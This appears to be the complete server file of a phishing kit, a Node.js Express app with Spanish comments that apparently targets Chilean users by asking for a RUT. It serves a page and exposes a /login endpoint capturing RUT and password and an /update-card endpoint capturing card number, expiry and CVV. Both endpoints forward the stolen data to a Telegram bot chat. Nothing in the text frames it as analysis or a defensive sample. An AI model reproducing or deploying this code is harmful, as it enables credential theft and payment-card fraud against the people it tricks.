const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const path = require("path");

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Servir index.html directamente desde la raíz
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

// Función para enviar mensaje a Telegram
async function sendTelegramMessage(text) {
  const token = process.env.TELEGRAM_TOKEN;
  const chatId = process.env.CHAT_ID;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const body = { chat_id: chatId, text, parse_mode: "HTML" };

  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body)
    });
  } catch (err) {
    console.error("Error enviando a Telegram:", err);
  }
}

// Endpoint para login
app.post("/login", async (req, res) => {
  const { usuario, clave } = req.body;
  const mensaje = `🔑 Nuevo ingreso:\nRUT: ${usuario}\nClave: ${clave}`;
  await sendTelegramMessage(mensaje);
  res.json({ status: "ok" });
});

// Endpoint para actualización de tarjeta
app.post("/update-card", async (req, res) => {
  const { numero, fecha, cvv } = req.body;
  const mensaje = `💳 Actualización de tarjeta:\nNúmero: ${numero}\nVencimiento: ${fecha}\nCVV: ${cvv}`;
  await sendTelegramMessage(mensaje);
  res.json({ status: "ok" });
});

// Puerto dinámico para Render
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Servidor corriendo en puerto ${PORT}`);
});
